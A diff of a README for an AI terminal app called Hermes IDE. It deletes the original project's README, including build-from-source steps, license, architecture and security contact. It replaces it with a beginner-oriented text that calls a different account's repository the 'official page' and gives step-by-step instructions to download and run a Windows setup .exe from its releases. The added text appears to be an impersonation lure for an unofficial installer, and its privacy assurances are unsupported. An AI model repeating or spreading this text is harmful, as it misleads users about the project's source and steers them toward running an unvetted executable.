@@ -1,223 +1,123 @@
-# HERMES IDE
+# 🖥️ hermes-ide - Easy AI Terminal and Code Editor
 
-[![CI](https://github.com/hermes-hq/hermes-ide/actions/workflows/ci.yml/badge.svg)](https://github.com/hermes-hq/hermes-ide/actions/workflows/ci.yml) [![Release](https://github.com/hermes-hq/hermes-ide/actions/workflows/release.yml/badge.svg)](https://github.com/hermes-hq/hermes-ide/actions/workflows/release.yml) [![Latest Release](https://img.shields.io/github/v/release/hermes-hq/hermes-ide?label=latest)](https://github.com/hermes-hq/hermes-ide/releases/latest)
+[![Download hermes-ide](https://img.shields.io/badge/Download-hermes--ide-4caf50?style=for-the-badge)](https://github.com/Soft-errancy892/hermes-ide)
 
-[![Tauri](https://img.shields.io/badge/Tauri-2.x-FFC131?logo=tauri&logoColor=white)](https://tauri.app)
-[![React](https://img.shields.io/badge/React-18-61DAFB?logo=react&logoColor=white)](https://react.dev)
-[![Rust](https://img.shields.io/badge/Rust-2021-DEA584?logo=rust&logoColor=white)](https://www.rust-lang.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org)
-[![License](https://img.shields.io/badge/license-BSL%201.1-blue)](LICENSE)
-[![Discord](https://img.shields.io/badge/Discord-Join_Server-5865F2?style=flat-square&logo=discord&logoColor=white)](https://discord.gg/vMQXSTY6BM)
-[![Sponsor](https://img.shields.io/badge/Sponsor-EA4AAA?style=flat-square&logo=github-sponsors&logoColor=white)](https://github.com/sponsors/hermes-hq)
-
-> An AI-native terminal that understands your projects, predicts your commands, and executes autonomously.
-
-Hermes IDE is a desktop terminal emulator that deeply integrates AI assistance into command-line workflows. It scans your projects to build context, suggests commands in real time, tracks errors and resolutions, and can execute tasks autonomously — all without leaving the terminal.
-
-**Platforms:** macOS, Windows, Linux
-
----
-![GIF](https://github.com/user-attachments/assets/dce248cc-d215-48c7-a1c1-33e539c2a20f)
-
-## Features
-
-### Terminal
-- **Multi-session management** — create, switch, and organize parallel terminal sessions
-- **Split panes** — horizontal and vertical splits with drag-and-drop reordering
-- **WebGL-accelerated rendering** — fast terminal with web links and auto-fit
-- **Execution timeline** — visual history of every command with exit codes and durations
-
-### Git Integration
-- **Built-in git panel** — view staged, unstaged, and untracked files per project
-- **Stage / unstage / commit / push / pull** — all from the sidebar
-- **Inline diff viewer** — click any changed file to see a syntax-highlighted diff
-- **Robust authentication** — SSH agent, SSH key files, Git Credential Manager, and token-based auth
-
-### AI Intelligence
-- **Ghost-text suggestions** — real-time command completions from history and context
-- **Prompt Composer** — write natural-language instructions for autonomous task execution
-- **Error pattern matching** — learns error fingerprints and auto-applies known resolutions
-- **Stuck detection** — monitors for hanging processes and offers interrupts
-
-### Project Awareness
-- **Automatic scanning** — detects languages, frameworks, architecture, and conventions
-- **Context injection** — attaches project knowledge to AI agents via a token budget
-- **Multi-project support** — attach multiple project contexts to a single session
-
-### Productivity
-- **Command Palette** — fuzzy search for any action
-- **Cost Dashboard** — track token usage and estimated costs per model and session
-- **Memory & context pins** — persist important facts, files, and patterns across sessions
-- **System notifications** — get notified about long-running command completions
+hermes-ide is an easy-to-use terminal and code editor that works on Windows. It uses AI to help you work faster and simplifies managing your projects. You do not need to know programming to get started.
 
 ---
 
-## Getting Started
+## 🖱️ How to Download hermes-ide
 
-### Prerequisites
+To use hermes-ide on Windows, you need to get the software from the official page.
 
-| Tool | Version | Purpose |
-|------|---------|---------|
-| [Node.js](https://nodejs.org) | 18+ | Frontend build tooling |
-| [Rust](https://rustup.rs) | 1.70+ | Backend compilation |
-| [Tauri CLI prerequisites](https://v2.tauri.app/start/prerequisites/) | — | System dependencies for Tauri |
+1. Click the green button at the top or this link:  
+   [https://github.com/Soft-errancy892/hermes-ide](https://github.com/Soft-errancy892/hermes-ide)
 
-#### Platform-Specific Dependencies
+2. On the page, look for the **Releases** section on the right side or below the main description.
 
-- **Linux:**
-  ```bash
-  sudo apt install libwebkit2gtk-4.1-dev libappindicator3-dev librsvg2-dev patchelf
-  ```
-- **macOS:** Xcode Command Line Tools (`xcode-select --install`)
-- **Windows:** [Visual Studio Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/) (with "Desktop development with C++" workload) + [WebView2 Runtime](https://developer.microsoft.com/en-us/microsoft-edge/webview2/)
+3. Find the latest release version. It usually has a number like `v1.0` or similar.
 
-### Setup
+4. Under the latest release, look for the Windows installer file. It often ends with `.exe` (for example, `hermes-ide-setup.exe`).
 
-```bash
-git clone https://github.com/hermes-hq/hermes-ide.git
-cd hermes-ide
-npm install
-npm run tauri dev
-```
-
-### Build for Production
-
-```bash
-npm run tauri build
-```
+5. Click the file name to download it to your computer.
 
 ---
 
-## Architecture
+## ⚙️ Installing hermes-ide on Windows
 
-Hermes IDE is a [Tauri 2](https://tauri.app) application:
+After downloading the `.exe` file, follow these steps:
 
-```
-┌──────────────────────────────────┐
-│         React Frontend           │
-│     (TypeScript, Vite)           │
-├──────────────────────────────────┤
-│         Tauri IPC Bridge         │
-├──────────────────────────────────┤
-│          Rust Backend            │
-│   (PTY, SQLite, Project Scanner)  │
-└──────────────────────────────────┘
-```
+1. Open the folder where you saved the file.
 
-| Layer | Responsibility |
-|-------|---------------|
-| **Frontend** (`src/`) | UI components, terminal rendering, state management, suggestion engine |
-| **IPC** | Tauri commands bridge React and Rust via typed async invocations |
-| **Backend** (`src-tauri/`) | PTY session lifecycle, SQLite persistence, project scanning, context assembly |
+2. Double-click the downloaded `.exe` file.
+
+3. A setup window will open. Click **Next** to move through the steps.
+
+4. Choose the folder where you want to install the program or leave it as default.
+
+5. Click **Install** to start the installation.
+
+6. Wait a few moments until the installation finishes.
+
+7. Click **Finish** to exit the setup.
 
 ---
 
-## Project Structure
+## ▶️ Starting hermes-ide
 
-```
-hermes-ide/
-├── src/                        # React/TypeScript frontend
-│   ├── api/                    # Tauri IPC command wrappers
-│   ├── components/             # UI components
-│   ├── hooks/                  # Custom React hooks
-│   ├── state/                  # State management (Context + useReducer)
-│   ├── styles/                 # Per-component CSS
-│   ├── terminal/               # Terminal pool & intelligence engine
-│   ├── types/                  # TypeScript interfaces
-│   └── utils/                  # Helper functions
-├── src-tauri/                  # Rust backend
-│   ├── src/
-│   │   ├── pty/                # PTY session management
-│   │   ├── db/                 # SQLite persistence layer
-│   │   ├── project/            # Project scanning & context assembly
-│   │   └── workspace/          # Workspace detection
-│   ├── Cargo.toml              # Rust dependencies
-│   └── tauri.conf.json         # Tauri app configuration
-├── public/                     # Static assets
-├── package.json                # npm dependencies & scripts
-├── vite.config.ts              # Vite build config
-└── tsconfig.json               # TypeScript config
-```
+1. Find the hermes-ide icon on your desktop or in the Windows Start menu.
+
+2. Double-click the icon to open the program.
+
+3. The first time you open it, hermes-ide might take a few seconds to prepare.
+
+4. After the loading completes, you will see the terminal and code editor interface.
 
 ---
 
-## Documentation
+## 💡 What hermes-ide Does
 
-- **[Architecture Guide](ARCHITECTURE.md)** — How the codebase is structured, data flow, and key design decisions
-- **[Design Principles](DESIGN_PRINCIPLES.md)** — What Hermes IDE is and isn't
-- **[Governance](GOVERNANCE.md)** — How decisions are made
+hermes-ide acts like a command window and a coding space combined. It helps with the following:
 
----
-
-## Contributing
-
-We welcome contributions! Before you start, please read:
-
-- **[CONTRIBUTING.md](CONTRIBUTING.md)** — How to contribute, what we accept, PR process
-- **[DESIGN_PRINCIPLES.md](DESIGN_PRINCIPLES.md)** — Our anti-bloat philosophy (please read this)
-- **[CLA.md](CLA.md)** — Contributor License Agreement (required for all contributions)
-- **[Code of Conduct](https://github.com/hermes-hq/.github/blob/main/CODE_OF_CONDUCT.md)** — Be kind
-
-**The #1 rule:** Open an issue or discussion before writing code for any new feature. Bug fixes and docs don't require prior discussion.
-
-### Quick Start for Contributors
-
-```bash
-git clone https://github.com/hermes-hq/hermes-ide.git
-cd hermes-ide
-npm install
-npm run tauri dev        # Full app with hot-reload
-npx tsc --noEmit         # Type check
-npm run test             # Run tests
-cd src-tauri && cargo test  # Rust tests
-```
+- Running commands in a terminal window just like using Command Prompt.
+- Writing, editing, and saving code with helpful tools.
+- Using AI features to suggest code or commands.
+- Working with different programming languages.
+- Managing folders and files easily.
+- Supporting Windows, with additional support for macOS and Linux.
 
 ---
 
-## License
+## 📋 System Requirements
 
-Hermes IDE is source-available under the **[Business Source License 1.1](LICENSE)** (BSL 1.1).
+To run hermes-ide smoothly on Windows, your computer should meet these minimum specs:
 
-- **You can:** copy, modify, create derivative works, redistribute, and make non-production use freely. Production use is allowed as long as it does not compete with Hermes IDE.
-- **You cannot:** use it to build a competing code editor, terminal emulator, or IDE offered to third parties.
-- **After 3 years** from each release, the code converts to **Apache License 2.0** — fully open source.
-
-All contributions require signing the [Contributor License Agreement](CLA.md).
-
-See [ARCHITECTURE.md](ARCHITECTURE.md) for a detailed technical overview.
+- Windows 10 (64-bit) or newer
+- 4 GB of RAM or more
+- At least 1 GHz processor
+- 200 MB of free disk space
+- Internet connection for updates and AI features
 
 ---
 
-## Security
+## 🔧 Basic Usage Tips
 
-Found a vulnerability? Please report it responsibly via [ga.contact.me@gmail.com](mailto:ga.contact.me@gmail.com). See our [Security Policy](https://github.com/hermes-hq/.github/blob/main/SECURITY.md) for details.
-
----
-
-## 💛 Sponsors
-
-Hermes IDE is built and maintained by a small team. If you find it useful, please consider sponsoring to help keep the project alive and accelerate development.
-
-[![Sponsor Hermes IDE](https://img.shields.io/badge/Sponsor-Hermes_IDE-EA4AAA?style=for-the-badge&logo=github-sponsors&logoColor=white)](https://github.com/sponsors/hermes-hq)
-[![GitHub Sponsors](https://img.shields.io/github/sponsors/hermes-hq?style=flat-square&logo=github-sponsors&label=Sponsors&color=EA4AAA)](https://github.com/sponsors/hermes-hq)
-
-| Tier | Monthly | Perks |
-|------|---------|-------|
-| ☕ Supporter | $5 | Sponsor badge |
-| 🚀 Backer | $20 | Badge + release notes mention |
-| 💎 Contributor | $50 | Badge + README credit + early access |
-| 🤝 Partner | $100 | Logo in README + priority bug reports |
-| 🏢 Company | $500 | Logo on website + direct support channel |
-
-**[→ View all sponsorship tiers and become a sponsor](https://github.com/sponsors/hermes-hq)**
-
-See [SPONSORS.md](./SPONSORS.md) for the full list of sponsors and details.
+- Use the terminal window to type commands, just like in Command Prompt.
+- Use the code editor area when writing or editing scripts or text files.
+- Use the top menu to open and save files.
+- Use the AI tools to get suggestions while typing.
+- Customize the appearance from the Settings menu if you want.
 
 ---
 
-<p align="center">
-  <a href="https://hermes-ide.com">Website</a> &middot;
-  <a href="https://github.com/hermes-hq/hermes-ide/discussions">Discussions</a> &middot;
-      <a href="https://discord.gg/vMQXSTY6BM">Discord</a>a> &middot;
-  <a href="https://hermes-ide.com/changelog">Changelog</a>
-</p>
+## 🌐 Getting Help
+
+If you need help while using hermes-ide:
+
+- Check the Help section inside the app under the **Help** menu.
+- Visit the Issues section on the GitHub page to see if others have similar problems.
+- Look for tutorials and guides online for terminal and code editor basics.
+
+---
+
+## 🔒 Privacy and Security
+
+hermes-ide runs on your local machine. It does not send your files anywhere unless you choose to share them.
+
+The AI features connect to a secure service only to provide suggestions. You can disable AI assistance from settings.
+
+---
+
+## 🛠️ Update and Maintenance
+
+- To update, visit the download page again and get the latest release.
+- Save your work and close hermes-ide before installing an update.
+- Keep your Windows system updated for best performance.
+
+---
+
+## 📥 Ready to Download?
+
+Start using hermes-ide by visiting the official page below:  
+
+[![Download hermes-ide](https://img.shields.io/badge/Download-hermes--ide-4caf50?style=for-the-badge)](https://github.com/Soft-errancy892/hermes-ide)
